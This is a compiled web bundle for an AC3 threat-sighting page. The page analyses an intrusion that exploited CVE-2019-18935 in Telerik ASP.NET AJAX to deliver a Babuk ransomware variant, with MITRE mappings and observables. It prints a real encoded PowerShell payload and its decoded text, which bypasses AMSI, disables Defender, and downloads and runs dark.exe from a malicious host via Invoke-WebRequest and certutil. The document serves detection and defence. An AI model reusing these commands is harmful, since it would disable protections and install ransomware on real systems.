"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[4646],{3248:function(t,e,a){var n=a(7294),r=a(7273);r.Z.initialize({startOnLoad:!0});e.Z=function(t){var e=t.chart;return(0,n.useEffect)((function(){r.Z.contentLoaded()}),[]),n.createElement("div",{className:"mermaid"},e)}},5382:function(t,e,a){a.r(e),a.d(e,{frontMatter:function(){return o},contentTitle:function(){return d},metadata:function(){return s},toc:function(){return c},default:function(){return m}});var n=a(7462),r=a(3366),A=(a(7294),a(4137)),l=a(3248),i=["components"],o={},d=void 0,s={unversionedId:"Sightings/Tortillas_Babuk",id:"Sightings/Tortillas_Babuk",isDocsHomePage:!1,title:"Tortillas_Babuk",description:"Overview",source:"@site/docs/03-Sightings/15-Tortillas_Babuk.md",sourceDirName:"03-Sightings",slug:"/Sightings/Tortillas_Babuk",permalink:"/ac3-threat-sightings/docs/Sightings/Tortillas_Babuk",tags:[],version:"current",sidebarPosition:15,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Hafnium",permalink:"/ac3-threat-sightings/docs/Sightings/Hafnium"},next:{title:"Emotet_Dec2021",permalink:"/ac3-threat-sightings/docs/Sightings/Emotet_Dec2021"}},c=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"Threat Actor used an exploit on a vulnerable component of a Public-Facing Application do drop malicious DLL for Initial Access.",id:"threat-actor-used-an-exploit-on-a-vulnerable-component-of-a-public-facing-application-do-drop-malicious-dll-for-initial-access",children:[]},{value:"Threat Actor used an exploit on Public-Facing Application to execute an encoded PowerShell command for Execution.",id:"threat-actor-used-an-exploit-on-public-facing-application-to-execute-an-encoded-powershell-command-for-execution",children:[]},{value:"Threat Actor used <em>encoded PowerShell command</em> for dropping additional artifacts for Command And Control.",id:"threat-actor-used-encoded-powershell-command-for-dropping-additional-artifacts-for-command-and-control",children:[]},{value:"Threat Actor used <em>CERTUTIL via PowerShell</em> to download additional artifacts for Command And Control.",id:"threat-actor-used-certutil-via-powershell-to-download-additional-artifacts-for-command-and-control",children:[]},{value:"Threat Actor used <em>PowerShell</em> to run the ransomware binary file for Impact.",id:"threat-actor-used-powershell-to-run-the-ransomware-binary-file-for-impact",children:[]}]}],p={toc:c};function m(t){var e=t.components,a=(0,r.Z)(t,i);return(0,A.kt)("wrapper",(0,n.Z)({},p,a,{components:e,mdxType:"MDXLayout"}),(0,A.kt)("h2",{id:"overview"},"Overview"),(0,A.kt)("p",null,"Unknown Threat Actor exploited vulnerability on Telerik UI for ASP.NET AJAX controls (CVE-2019-18935) to deploy a variant of Babuk ransomware. In this Threat Sighting, ENS blocked (detected and deleted) the 2nd stage malware, we've complemented the Sighting with OSINT."),(0,A.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,A.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Tortillas_Babuk.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Tortillas_Babuk.yml")),(0,A.kt)("p",null,"Author: Alejandro Houspanossian (@lekz86)"),(0,A.kt)("p",null,"Acknowledgements: @VirITeXplorer, @th3_protoCOL, @lekz86"),(0,A.kt)("h3",{id:"references"},"References:"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},(0,A.kt)("a",{parentName:"li",href:"https://twitter.com/th3_protoCOL/status/1448701084785000448"},"https://twitter.com/th3_protoCOL/status/1448701084785000448")),(0,A.kt)("li",{parentName:"ul"},(0,A.kt)("a",{parentName:"li",href:"https://twitter.com/VirITeXplorer/status/1448689555083780101"},"https://twitter.com/VirITeXplorer/status/1448689555083780101")),(0,A.kt)("li",{parentName:"ul"},(0,A.kt)("a",{parentName:"li",href:"https://chuongdong.com//reverse%20engineering/2021/01/03/BabukRansomware/"},"https://chuongdong.com//reverse%20engineering/2021/01/03/BabukRansomware/")),(0,A.kt)("li",{parentName:"ul"},(0,A.kt)("a",{parentName:"li",href:"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/babuk-ransomware/"},"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/babuk-ransomware/"))),(0,A.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"Threat Actor used an exploit on a vulnerable component of a Public-Facing Application do drop malicious DLL for Initial Access."),(0,A.kt)("li",{parentName:"ul"},"Threat Actor used an exploit on Public-Facing Application to execute an encoded PowerShell command for Execution."),(0,A.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,A.kt)("em",{parentName:"li"},"encoded PowerShell command")," for dropping additional artifacts for Command And Control."),(0,A.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,A.kt)("em",{parentName:"li"},"CERTUTIL via PowerShell")," to download additional artifacts for Command And Control."),(0,A.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,A.kt)("em",{parentName:"li"},"PowerShell")," to run the ransomware binary file for Impact.")),(0,A.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,A.kt)("table",null,(0,A.kt)("thead",{parentName:"table"},(0,A.kt)("tr",{parentName:"thead"},(0,A.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,A.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,A.kt)("tbody",{parentName:"table"},(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,A.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Execution"),(0,A.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Impact"),(0,A.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,A.kt)("td",{parentName:"tr",align:null},"++ (2)")))),(0,A.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,A.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,A.kt)(l.Z,{chart:"\ngraph LR\nIA[Initial Access] --\x3e | an exploit on a vulnerable component of a Public-Facing Application do drop malicious DLL| IA[Initial Access]\nIA[Initial Access] --\x3e | an exploit on Public-Facing Application to execute an encoded PowerShell command| EXE[Execution]\nEXE[Execution] --\x3e | _encoded PowerShell command_ for dropping additional artifacts| C2[Command And Control]\nEXE[Execution] --\x3e | _CERTUTIL via PowerShell_ to download additional artifacts| C2[Command And Control]\nEXE[Execution] --\x3e | _PowerShell_ to run the ransomware binary file| IMP[Impact]\n",mdxType:"Mermaid"}),(0,A.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,A.kt)("table",null,(0,A.kt)("thead",{parentName:"table"},(0,A.kt)("tr",{parentName:"thead"},(0,A.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,A.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,A.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,A.kt)("tbody",{parentName:"table"},(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,A.kt)("td",{parentName:"tr",align:null},"T1190 - Exploit Public-Facing Application"),(0,A.kt)("td",{parentName:"tr",align:null},"Threat Actor used an exploit on a vulnerable component of a Public-Facing Application do drop malicious DLL for Initial Access.")),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Execution"),(0,A.kt)("td",{parentName:"tr",align:null},"T1203 - Exploitation for Client Execution",(0,A.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,A.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell",(0,A.kt)("br",null),"T1190 - Exploit Public-Facing Application"),(0,A.kt)("td",{parentName:"tr",align:null},"Threat Actor used an exploit on Public-Facing Application to execute an encoded PowerShell command for Execution.")),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,A.kt)("td",{parentName:"tr",align:null},"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,A.kt)("br",null),"T1562.001 - Impair Defenses: Disable or Modify Tools",(0,A.kt)("br",null),"T1027 - Obfuscated Files or Information",(0,A.kt)("br",null),"T1105 - Ingress Tool Transfer",(0,A.kt)("br",null),"T1071.001 - Application Layer Protocol: Web Protocols"),(0,A.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,A.kt)("em",{parentName:"td"},"encoded PowerShell command")," for dropping additional artifacts for Command And Control.")),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,A.kt)("td",{parentName:"tr",align:null},"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,A.kt)("br",null),"T1105 - Ingress Tool Transfer",(0,A.kt)("br",null),"T1071.001 - Application Layer Protocol: Web Protocols"),(0,A.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,A.kt)("em",{parentName:"td"},"CERTUTIL via PowerShell")," to download additional artifacts for Command And Control.")),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Impact"),(0,A.kt)("td",{parentName:"tr",align:null}),(0,A.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,A.kt)("em",{parentName:"td"},"PowerShell")," to run the ransomware binary file for Impact.")))),(0,A.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,A.kt)("table",null,(0,A.kt)("thead",{parentName:"table"},(0,A.kt)("tr",{parentName:"thead"},(0,A.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,A.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,A.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,A.kt)("th",{parentName:"tr",align:null},"Observables"),(0,A.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,A.kt)("tbody",{parentName:"table"},(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,A.kt)("td",{parentName:"tr",align:null},"T1190"),(0,A.kt)("td",{parentName:"tr",align:null},"Threat Actor used an exploit on a vulnerable component of a Public-Facing Application do drop malicious DLL for Initial Access."),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"Process Created"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\SysWOW64\\\\inetsrv\\\\w3wp.exe -ap \\"BrilliumAppPool\\" -v \\"v4.0\\" -l \\"webengine4.dll\\" -a \\\\\\\\.\\\\pipe\\\\iisipmb4ec5225-60c6-4ac5-b0ca-42819f013936 -h \\"C:\\\\inetpub\\\\temp\\\\apppools\\\\BrilliumAppPool\\\\BrilliumAppPool.config\\" -w \\"\\" -m 0 -t 20 -ta 0'),(0,A.kt)("br",null),(0,A.kt)("em",{parentName:"td"},"File Created"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\Temp\\\\1634071049.71722.dll.tmp")),(0,A.kt)("td",{parentName:"tr",align:null},"- w3wp.exe is Internet Information Services (IIS) Worker Process",(0,A.kt)("br",null),"- BrilliumAppPool is part of Brillium Assessment Software, a web application that apparently uses Telerik ASP.NET AJAX components (",(0,A.kt)("a",{parentName:"td",href:"https://secure.testcraft.com/ex/Versions1.aspx"},"https://secure.testcraft.com/ex/Versions1.aspx"),")",(0,A.kt)("br",null),"- Telerik ASP.NET AJAX components are vulnerable to CVE-2019-18935, which enables remote code execution.",(0,A.kt)("br",null),"- 33/66 @ VT. First submitted by the time of this sighting (",(0,A.kt)("a",{parentName:"td",href:"https://www.virustotal.com/gui/file/56b7e6dd46e38a30ead82790947a425661ad893f54060381c9b76616c27d3b9f"},"https://www.virustotal.com/gui/file/56b7e6dd46e38a30ead82790947a425661ad893f54060381c9b76616c27d3b9f"),")",(0,A.kt)("br",null),"- There is a known vulnerability on Telerik ASP.NET AJAX components (",(0,A.kt)("a",{parentName:"td",href:"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18935"},"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18935"),")")),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Execution"),(0,A.kt)("td",{parentName:"tr",align:null},"T1203",(0,A.kt)("br",null),"T1059.001",(0,A.kt)("br",null),"T1059.003",(0,A.kt)("br",null),"T1190"),(0,A.kt)("td",{parentName:"tr",align:null},"Threat Actor used an exploit on Public-Facing Application to execute an encoded PowerShell command for Execution."),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"Process Created"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -e JAB3ACAAPQAgA[REDACTED]")),(0,A.kt)("td",{parentName:"tr",align:null},"- A common pattern after explotation of externally facing wep applications is to see IIS worker process (w3wp.exe) as parent process of suspcicious process execution.")),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,A.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,A.kt)("br",null),"T1562.001",(0,A.kt)("br",null),"T1027",(0,A.kt)("br",null),"T1105",(0,A.kt)("br",null),"T1071.001"),(0,A.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,A.kt)("em",{parentName:"td"},"encoded PowerShell command")," for dropping additional artifacts for Command And Control."),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"Process Created"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},"powershell.exe  -nop -w hidden -e JAB3ACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYwAgAD0AIAAnAHMAaQAnADsAJABtACAAPQAgACcAVQB0AGkAbABzACcAOwAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AG0AewAxAH0AewAyAH0AJwAgAC0AZgAgACQAdwAsACQAYwAsACQAbQApACkAIAA7ACAAJABmAGkAZQBsAGQAIAA9ACAAJABhAHMAcwBlAG0AYgBsAHkALgBHAGUAdABGAGkAZQBsAGQAKAAoACcAYQBtAHsAMAB9AEkAbgBpAHQARgBhAGkAbABlAGQAJwAgAC0AZgAgACQAYwApACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7ACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwBTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlACAALQBEAGkAcwBhAGIAbABlAFMAYwByAGkAcAB0AFMAYwBhAG4AbgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIAAkAHQAcgB1AGUAIAAtAEQAaQBzAGEAYgBsAGUASQBuAHQAcgB1AHMAaQBvAG4AUAByAGUAdgBlAG4AdABpAG8AbgBTAHkAcwB0AGUAbQAgACQAdAByAHUAZQA7ACAAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAgACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AEkAbgB2AG8AawBlAC0AVwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AdQByAGkAIABoAHQAdABwADoALwAvAGYAYgBpAC4AZgB1AG4AZAAvAGQAYQByAGsALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgAGQAYQByAGsALgBlAHgAZQA7AGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQB1AHIAbABjAGEAYwBoAGUAIAAtAHMAcABsAGkAdAAgAC0AZgAgAGgAdAB0AHAAOgAvAC8AZgBiAGkALgBmAHUAbgBkAC8AZABhAHIAawAuAGUAeABlACAAOwAgAC4AXABkAGEAcgBrAC4AZQB4AGUA"),(0,A.kt)("br",null),(0,A.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,A.kt)("inlineCode",{parentName:"td"},"fbi[.]fund"),(0,A.kt)("br",null),(0,A.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,A.kt)("inlineCode",{parentName:"td"},"185.219.52[.]229"),(0,A.kt)("br",null),(0,A.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,A.kt)("inlineCode",{parentName:"td"},"fbi[.]fund")),(0,A.kt)("td",{parentName:"tr",align:null},"- Payload includes an attempt to bypass AMSI",(0,A.kt)("br",null),"- Payload includes an attempt to download and execute additional malware.",(0,A.kt)("br",null),"- Decoded b64 payload follows",(0,A.kt)("br",null),"- $w = \\'System.Management.Automation.A\\'; $c = \\'si\\'; $m = \\'Utils\\'; $assembly = ","[Ref]",".Assembly.GetType((\\'{0}m{1}{2}\\' -f $w,$c,$m)); $field = $assembly.GetField((\\'am{0}InitFailed\\' -f $c),\\'NonPublic,Static\\'); $field.SetValue($null,$true); Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true; ","[Ref]",".Assembly.GetType(\\'System.Management.Automation.AmsiUtils\\').GetField(\\'amsiInitFailed\\', \\'NonPublic,Static\\').SetValue($null,$true); Invoke-Webrequest -uri http://fbi","[.]","fund/dark.exe -outfile dark.exe; certutil.exe -urlcache -split -f http://fbi","[.]","fund/dark.exe; .","\\","dark.exe;",(0,A.kt)("br",null),"- Invoke-Webrequest -uri http://fbi","[.]","fund/dark.exe -outfile dark.exe",(0,A.kt)("br",null),"- This IP has been seen delivering dark.exe and other binaries (",(0,A.kt)("a",{parentName:"td",href:"https://urlscan.io/search/#185.219.52.229"},"https://urlscan.io/search/#185.219.52.229"),")")),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,A.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,A.kt)("br",null),"T1105",(0,A.kt)("br",null),"T1071.001"),(0,A.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,A.kt)("em",{parentName:"td"},"CERTUTIL via PowerShell")," to download additional artifacts for Command And Control."),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"Process Created"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\certutil.exe\\" -urlcache -split -f http://fbi[.]fund/dark.exe'),(0,A.kt)("br",null),(0,A.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,A.kt)("inlineCode",{parentName:"td"},"fbi[.]fund"),(0,A.kt)("br",null),(0,A.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,A.kt)("inlineCode",{parentName:"td"},"185.219.52[.]229"),(0,A.kt)("br",null),(0,A.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,A.kt)("inlineCode",{parentName:"td"},"fbi[.]fund"),(0,A.kt)("br",null),(0,A.kt)("em",{parentName:"td"},"File Modified"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\ServiceProfiles\\\\NetworkService\\\\AppData\\\\LocalLow\\\\Microsoft\\\\CryptnetUrlCache\\\\Content\\\\B95F7C314E77C19D7A1EC2DDAB877740")),(0,A.kt)("td",{parentName:"tr",align:null},"- NT AUTHORITY\\NETWORK SERVICE ran C:","\\","Windows","\\","SysWOW64","\\","certutil.exe, which attempted to access C:","\\","Windows","\\","ServiceProfiles","\\","NetworkService","\\","AppData","\\","LocalLow","\\","Microsoft","\\","CryptnetUrlCache","\\","Content","\\","B95F7C314E77C19D7A1EC2DDAB877740. The Trojan named GenericRXPZ-PI!CD66BE302D78 was detected and deleted.",(0,A.kt)("br",null),"- Event corresponds most likely to the donwload attempt for ",(0,A.kt)("em",{parentName:"td"},"dark.exe"),".")),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"Impact"),(0,A.kt)("td",{parentName:"tr",align:null}),(0,A.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,A.kt)("em",{parentName:"td"},"PowerShell")," to run the ransomware binary file for Impact."),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"Process Created"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},"dark.exe"),(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},"tortilla.exe")),(0,A.kt)("td",{parentName:"tr",align:null},"- This behavior was not found on EDR Telemetry by the time of this investigation (as ENS blocked the attack). But there are reports from 2 researchers about similar cases.",(0,A.kt)("br",null),"- File hash has 37/67 detection @ VT (sample submitted by the time of this investigation)",(0,A.kt)("br",null),"- Sophos team reports this as ransomware (",(0,A.kt)("a",{parentName:"td",href:"https://mobile.twitter.com/th3_protoCOL/status/1448701084785000448"},"https://mobile.twitter.com/th3_protoCOL/status/1448701084785000448"),")",(0,A.kt)("br",null),"- TG Soft (@VirITeXplorer) reports dark.exe / tortillas.exe to deploy a modified version of Babuk ransomware (",(0,A.kt)("a",{parentName:"td",href:"https://mobile.twitter.com/VirITeXplorer/status/1448689555083780101"},"https://mobile.twitter.com/VirITeXplorer/status/1448689555083780101"),")",(0,A.kt)("br",null),"- TG Soft (@VirITeXplorer) reports ransom note named 'How To Restore Your Files.txt', and file extension for encrypted files as .babyk.")))),(0,A.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,A.kt)("h3",{id:"threat-actor-used-an-exploit-on-a-vulnerable-component-of-a-public-facing-application-do-drop-malicious-dll-for-initial-access"},"Threat Actor used an exploit on a vulnerable component of a Public-Facing Application do drop malicious DLL for Initial Access."),(0,A.kt)("h4",{id:"tactic"},"Tactic"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"Initial Access")),(0,A.kt)("h4",{id:"techniques"},"Techniques"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"T1190 - Exploit Public-Facing Application")),(0,A.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,A.kt)("table",null,(0,A.kt)("thead",{parentName:"table"},(0,A.kt)("tr",{parentName:"thead"},(0,A.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,A.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,A.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,A.kt)("tbody",{parentName:"table"},(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null}),(0,A.kt)("td",{parentName:"tr",align:null},"Internet Information Services -IIS- Worker Process -",(0,A.kt)("em",{parentName:"td"},"w3wp.exe"),"- ran Public-Facing Application (Brillium Assessment Software)."),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"Process Created"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\SysWOW64\\\\inetsrv\\\\w3wp.exe -ap \\"BrilliumAppPool\\" -v \\"v4.0\\" -l \\"webengine4.dll\\" -a \\\\\\\\.\\\\pipe\\\\iisipmb4ec5225-60c6-4ac5-b0ca-42819f013936 -h \\"C:\\\\inetpub\\\\temp\\\\apppools\\\\BrilliumAppPool\\\\BrilliumAppPool.config\\" -w \\"\\" -m 0 -t 20 -ta 0'))),(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"T1190"),(0,A.kt)("td",{parentName:"tr",align:null},"IIS Worker Process -",(0,A.kt)("em",{parentName:"td"},"w3wp.exe"),"- drops malicious dll."),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"File Created"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\Temp\\\\1634071049.71722.dll.tmp"))))),(0,A.kt)("h4",{id:"notes"},"Notes"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"33/66 @ VT. First submitted by the time of this sighting (",(0,A.kt)("a",{parentName:"li",href:"https://www.virustotal.com/gui/file/56b7e6dd46e38a30ead82790947a425661ad893f54060381c9b76616c27d3b9f"},"https://www.virustotal.com/gui/file/56b7e6dd46e38a30ead82790947a425661ad893f54060381c9b76616c27d3b9f"),")"),(0,A.kt)("li",{parentName:"ul"},"There is a known vulnerability on Telerik ASP.NET AJAX components (",(0,A.kt)("a",{parentName:"li",href:"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18935"},"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18935"),")")),(0,A.kt)("h3",{id:"threat-actor-used-an-exploit-on-public-facing-application-to-execute-an-encoded-powershell-command-for-execution"},"Threat Actor used an exploit on Public-Facing Application to execute an encoded PowerShell command for Execution."),(0,A.kt)("h4",{id:"tactic-1"},"Tactic"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"Execution")),(0,A.kt)("h4",{id:"techniques-1"},"Techniques"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"T1203 - Exploitation for Client Execution"),(0,A.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,A.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,A.kt)("li",{parentName:"ul"},"T1190 - Exploit Public-Facing Application")),(0,A.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,A.kt)("table",null,(0,A.kt)("thead",{parentName:"table"},(0,A.kt)("tr",{parentName:"thead"},(0,A.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,A.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,A.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,A.kt)("tbody",{parentName:"table"},(0,A.kt)("tr",{parentName:"tbody"},(0,A.kt)("td",{parentName:"tr",align:null},"T1203",(0,A.kt)("br",null),"T1059.001",(0,A.kt)("br",null),"T1059.003",(0,A.kt)("br",null),"T1190"),(0,A.kt)("td",{parentName:"tr",align:null},"IIS worker process (w3wp.exe) launched CMD for encoded PowerShell command execution."),(0,A.kt)("td",{parentName:"tr",align:null},(0,A.kt)("em",{parentName:"td"},"Process Created"),": ",(0,A.kt)("br",null),"- ",(0,A.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -e JAB3ACAAPQAgA[REDACTED]"))))),(0,A.kt)("h4",{id:"notes-1"},"Notes"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"A common pattern after explotation of externally facing wep applications is to see IIS worker process (w3wp.exe) as parent process of suspcicious process execution.")),(0,A.kt)("h3",{id:"threat-actor-used-encoded-powershell-command-for-dropping-additional-artifacts-for-command-and-control"},"Threat Actor used ",(0,A.kt)("em",{parentName:"h3"},"encoded PowerShell command")," for dropping additional artifacts for Command And Control."),(0,A.kt)("h4",{id:"tactic-2"},"Tactic"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"Command And Control")),(0,A.kt)("h4",{id:"techniques-2"},"Techniques"),(0,A.kt)("ul",null,(0,A.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,A.kt)("li",{parentName:"ul"},"T1562.001 - Impair Defenses: Disable or Modify Tools"),(0,A.kt)("li",{parentName:"ul"},"T1027 - Obfuscated Files or Information"),(0,A.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool 